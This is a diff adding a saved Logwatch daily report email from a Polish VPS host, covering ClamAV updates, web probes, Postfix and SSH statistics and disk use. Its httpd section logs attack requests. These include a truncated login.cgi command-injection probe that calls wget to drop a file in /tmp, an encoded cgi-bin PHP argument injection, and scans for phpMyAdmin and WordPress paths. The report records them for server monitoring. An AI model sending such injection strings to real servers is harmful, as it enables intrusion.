@@ -1,0 +1,131 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 13F509F20297; Sat, 11 Aug 2018 03:16:08 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20180811011608.13F509F20297@hrankiety.pl>
+Date: Sat, 11 Aug 2018 03:16:05 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Sat Aug 11 03:16:05 2018
+        Date Range Processed: yesterday
+                              ( 2018-Aug-10 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Fri Aug 10 03:26:06 2018
+ 
+ Last Status:
+    main.cvd is up to date (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)
+    Downloading daily-24825.cdiff [100%]
+    Downloading daily-24826.cdiff [100%]
+    Downloading daily-24827.cdiff [100%]
+    daily.cld updated (version: 24827, sigs: 2043871, f-level: 63, builder: neo)
+    Downloading bytecode-327.cdiff [100%]
+    bytecode.cld updated (version: 327, sigs: 91, f-level: 63, builder: neo)
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/main.cvd and /var/lib/clamav/main.cld, please manually remove one of them
+    Database updated (6610211 signatures) from db.local.clamav.net (IP: 104.16.188.138)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 1 sites probed the server 
+    85.93.20.247
+ 
+ Requests with error response codes
+    400 Bad Request
+       /login.cgi?cli=aa%20aa%27;wget%20http://80 ... 0/tmp/xd123%27$: 3 Time(s)
+       HTTP/1.1: 1 Time(s)
+       null: 2 Time(s)
+    404 Not Found
+       //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+% ... 70%75%74+%2D%6E: 1 Time(s)
+       //wp-login.php: 2 Time(s)
+       //xmlrpc.php: 1 Time(s)
+       /MyAdmin/scripts/setup.php: 2 Time(s)
+       /admin/assets/js/views/login.js: 1 Time(s)
+       /blog//wp-login.php: 1 Time(s)
+       /index.action: 1 Time(s)
+       /index.do: 1 Time(s)
+       /manager/html: 1 Time(s)
+       /myadmin/scripts/setup.php: 1 Time(s)
+       /phpMyAdmin/scripts/setup.php: 2 Time(s)
+       /phpmyadmin/scripts/setup.php: 2 Time(s)
+       /pma/scripts/setup.php: 1 Time(s)
+       /struts2-rest-showcase/orders.xhtml: 1 Time(s)
+       /w00tw00t.at.blackhats.romanian.anti-sec:): 2 Time(s)
+       /wordpress//wp-login.php: 1 Time(s)
+       /wp//wp-login.php: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       21   *Warning: Pre-queue content-filter connection overload 
+     5860   SASL authentication failed 
+       47   Miscellaneous warnings 
+ 
+    1.501M  Bytes accepted                         1,574,001
+    1.495M  Bytes delivered                        1,567,795
+ ========   ================================================
+ 
+       26   Accepted                                 100.00%
+ --------   ------------------------------------------------
+       26   Total                                    100.00%
+ ========   ================================================
+ 
+     5904   Connections made      
+     5903   Disconnections        
+       26   Removed from queue    
+       24   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        1   Timeout (inbound)     
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   23G   28G  46% /
+ none            512M  4.0K  512M   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
